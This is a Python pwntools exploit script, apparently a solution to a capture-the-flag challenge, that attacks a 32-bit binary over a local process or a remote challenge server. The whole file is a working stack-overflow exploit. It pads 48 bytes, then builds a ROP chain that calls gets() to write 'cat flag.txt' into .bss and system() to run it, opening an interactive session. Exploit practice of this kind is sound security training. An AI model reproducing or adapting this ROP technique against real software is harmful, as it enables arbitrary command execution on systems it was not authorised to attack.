#!/usr/bin/env python3
from pwn import *

exe = ELF("./vuln")
context.binary = exe

if args.REMOTE:
    r = remote("chals.disorientation.cssa.club", 1346)
else:
    r = process(exe.path)
    if args.GDB:
        gdb.attach(r)

# From GDB, No ASLR + PIE 
gets_plt       = 0x08048250
system_plt     = 0x080482a0
pop_ret        = 0x080481f6
bss            = 0x0804b044

# Number of bytes to reach the return address on the stack
OFFSET = 48

# Write "cat flag.txt" to bss via gets, then call system(bss)
rop  = p32(gets_plt)   + p32(pop_ret)   + p32(bss)       # gets(bss) <- "cat flag.txt"
rop += p32(system_plt) + p32(0xdeadbeef) + p32(bss)      # system(bss)
payload = b'A' * OFFSET + rop

# Trigger get_name()
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b':', payload)

# Program is currently executing gets(bss)
r.sendline(b'cat flag.txt')   
r.interactive()
